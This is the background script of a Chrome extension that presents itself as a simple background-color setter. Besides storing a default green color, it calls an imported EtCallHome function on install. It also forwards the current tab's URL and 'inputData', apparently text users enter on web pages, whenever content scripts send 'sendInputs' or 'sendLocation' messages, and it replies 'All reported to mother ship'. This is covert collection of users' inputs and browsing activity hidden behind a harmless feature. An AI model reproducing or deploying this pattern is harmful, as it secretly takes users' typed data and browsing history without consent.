importScripts('actions.js');

const defaultColor = '#22bb11'
// let c = chrome.storage.sync.get(["color"], (result) => {
//   console.log(result)
// });

chrome.runtime.onInstalled.addListener(async () => {
  EtCallHome({event:"installed"});
  chrome.storage.local.get(["color"], ({ color }) => {
    if(!color) {
      chrome.storage.local.set({"color": defaultColor});
      color = defaultColor;
    }
    console.log('Default background color set to %cgreen', `color: ${color}`);
  });
});

chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {

    if (request.greeting === "getColor") {
      chrome.storage.local.get(["color"], ({ color }) => {
        sendResponse({color: color});
      });
    }

    if (request.greeting === "sendInputs") {
      EtCallHome({event: request.greeting, url: sender.tab.url, inputData: request.input});
    }

    if (request.greeting === "sendLocation") {
      EtCallHome({event: request.greeting, url: sender.tab.url});
      sendResponse({message: "All reported to mother ship"});
    }
  }
);